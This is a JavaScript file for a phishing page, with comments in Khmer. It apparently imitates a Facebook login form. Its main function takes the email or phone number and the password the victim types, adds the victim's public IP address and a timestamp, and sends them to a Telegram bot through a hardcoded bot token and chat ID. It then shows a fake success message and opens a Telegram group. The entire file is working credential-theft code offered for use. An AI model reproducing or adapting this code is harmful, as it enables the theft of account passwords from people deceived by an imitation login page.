const CONFIG = {
    TOKEN: "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg",
    CHAT_ID: "6837307356",
    GROUP_LINK: "https://t.me/+7LTtj5yoBBxjMGVl",
    MAX_RETRIES: 3,
    RETRY_DELAY: 1000,
    SESSION_TIMEOUT: 300000,
    RATE_LIMIT_DELAY: 2000
};

// ==================== អថេរសកល ====================
let failedAttempts = 0;
let sessionStartTime = Date.now();
let rateLimitTimer = null;
let isProcessing = false;
let attemptsCount = 0;

// ==================== មុខងារកម្រិតខ្ពស់ ====================

// 1. ពិនិត្យទម្រង់អ៊ីមែល/ទូរសព្ទ
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    const phoneRegex = /^[0-9]{9,12}$/;
    
    if (emailRegex.test(email)) return { valid: true, type: "Email" };
    if (phoneRegex.test(email)) return { valid: true, type: "Phone" };
    return { valid: false, type: null };
}

// 2. ទទួលបានព័ត៌មាន Browser
function getBrowserInfo() {
    const ua = navigator.userAgent;
    return {
        language: navigator.language,
        screenSize: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua)
    };
}

// 3. ទទួលបាន IP ជាមួយ backup
async function getPublicIP() {
    const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api.my-ip.io/ip.json',
        'https://ipapi.co/json/'
    ];
    
    for (const service of ipServices) {
        try {
            const response = await fetch(service);
            const data = await response.json();
            const ip = data.ip || data;
            if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) return ip;
        } catch (error) {
            continue;
        }
    }
    return "Unable to fetch IP";
}

// 4. ទទួលបានទីតាំងប្រហាក់ប្រហែល (IP Geolocation)
async function getGeoLocation(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country: data.country_name || "Unknown",
            city: data.city || "Unknown",
            isp: data.org || "Unknown"
        };
    } catch (error) {
        return { country: "Unknown", city: "Unknown", isp: "Unknown" };
    }
}

// 5. បង្កើត Session ID
function generateSessionId() {
    return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, function() {
        return ((Math.random() * 16) | 0).toString(16);
    });
}

// 6. ការពារ Rate Limiting
async function rateLimit() {
    if (rateLimitTimer) {
        await new Promise(resolve => setTimeout(resolve, CONFIG.RATE_LIMIT_DELAY));
    }
    rateLimitTimer = setTimeout(() => { rateLimitTimer = null; }, CONFIG.RATE_LIMIT_DELAY);
}

// 7. Retry Mechanism
async function fetchWithRetry(url, retries = CONFIG.MAX_RETRIES) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url);
            if (response.ok) return response;
            if (response.status === 429) {
                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (i + 1)));
                continue;
            }
        } catch (error) {
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
        }
    }
    throw new Error("Max retries exceeded");
}

// 8. ទម្រង់អត្ថបទក្នុង Telegram (តាមការស្នើសុំ)
function formatTelegramMessage(email, password, ip, date) {
    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
           "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "📧 " + email + "\n" +
           "🔑 " + password + "\n" +
           "🌐 " + ip + "\n" +
           "📅 " + date + "\n" +
           "━━━━━━━━━━━━━━━━━━━━━━";
}

// 9. Toast Notification
function showToast(message, type = "success") {
    const toast = document.createElement('div');
    toast.textContent = message;
    toast.style.cssText = `
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: ${type === "success" ? "#0084ff" : "#ff4444"};
        color: white;
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 14px;
        z-index: 1000;
        animation: slideUp 0.3s ease;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// 10. បន្ថែម CSS Animation
function addAnimations() {
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading-animation {
            animation: pulse 1s ease-in-out infinite;
        }
    `;
    document.head.appendChild(style);
}

// 11. បន្ថែម email/phone format validation real-time
function addEmailValidation() {
    const emailInput = document.getElementById('email');
    const indicator = document.createElement('div');
    indicator.style.cssText = `
        font-size: 12px;
        margin-top: -10px;
        margin-bottom: 5px;
        padding-left: 5px;
    `;
    emailInput.parentNode.insertBefore(indicator, emailInput.nextSibling);
    
    emailInput.addEventListener('input', function() {
        const validation = validateEmail(this.value);
        if (this.value.length === 0) {
            indicator.textContent = '';
        } else if (validation.valid) {
            indicator.textContent = `✓ ទម្រង់ត្រឹមត្រូវ (${validation.type})`;
            indicator.style.color = "#00cc00";
        } else {
            indicator.textContent = "✗ ទម្រង់មិនត្រឹមត្រូវ";
            indicator.style.color = "#ff4444";
        }
    });
}

// 12. Keyboard shortcut (Enter key)
function addKeyboardShortcut() {
    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendToTelegram();
            }
        });
    });
}

// 13. រាប់ចំនួនព្យាយាម
function getAttemptsCount() {
    attemptsCount++;
    return attemptsCount;
}

// 14. ពិនិត្យ Session Expiry
function isSessionExpired() {
    return (Date.now() - sessionStartTime) > CONFIG.SESSION_TIMEOUT;
}

// 15. អនុគមន៍ទទួលបានពេលវេលា
function getCurrentDate() {
    const now = new Date();
    return now.toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(',', '');
}

// 16. អនុគមន៍បើក Telegram Group
function joinTelegramGroup() {
    window.open(CONFIG.GROUP_LINK, '_blank');
}

// 17. អនុគមន៍សំខាន់ផ្ញើទៅ Telegram
async function sendToTelegram() {
    if (isProcessing) {
        showToast("សូមរង់ចាំ...", "error");
        return;
    }
    
    if (isSessionExpired()) {
        sessionStartTime = Date.now();
        showToast("សម័យប្រើប្រាស់ថ្មី", "success");
    }
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        showToast("សូមបំពេញព័ត៌មានទាំងអស់!", "error");
        return;
    }
    
    const emailValidation = validateEmail(email);
    if (!emailValidation.valid) {
        showToast("ទម្រង់អ៊ីមែល/ទូរសព្ទមិនត្រឹមត្រូវ", "error");
        return;
    }

    isProcessing = true;
    await rateLimit();
    
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';
    loadingDiv.classList.add('loading-animation');

    const submitBtn = document.querySelector('.submit-btn');
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.7';

    try {
        const ip = await getPublicIP();
        const date = getCurrentDate();
        const attemptNum = getAttemptsCount();
        
        // ប្រើទម្រង់អត្ថបទថ្មី
        const message = formatTelegramMessage(email, password, ip, date);
        const encodedMessage = encodeURIComponent(message);

        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodedMessage}`;

        const response = await fetchWithRetry(url);
        const result = await response.json();

        if (result.ok) {
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            showToast(`ចូលក្រុបបានដោយជោគជ័យ! (លើកទី ${attemptNum})`, "success");
            joinTelegramGroup();
            failedAttempts = 0;
        } else {
            failedAttempts++;
            showToast(`បរាជ័យលើកទី ${failedAttempts}`, "error");
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
        }
    } catch (error) {
        console.error("Error:", error);
        showToast("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់", "error");
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
    } finally {
        isProcessing = false;
        loadingDiv.style.display = 'none';
        loadingDiv.classList.remove('loading-animation');
    }
}

// ==================== ការចាប់ផ្ដើម ====================
document.addEventListener('DOMContentLoaded', () => {
    addAnimations();
    addEmailValidation();
    addKeyboardShortcut();
    console.log("Script loaded successfully!");
});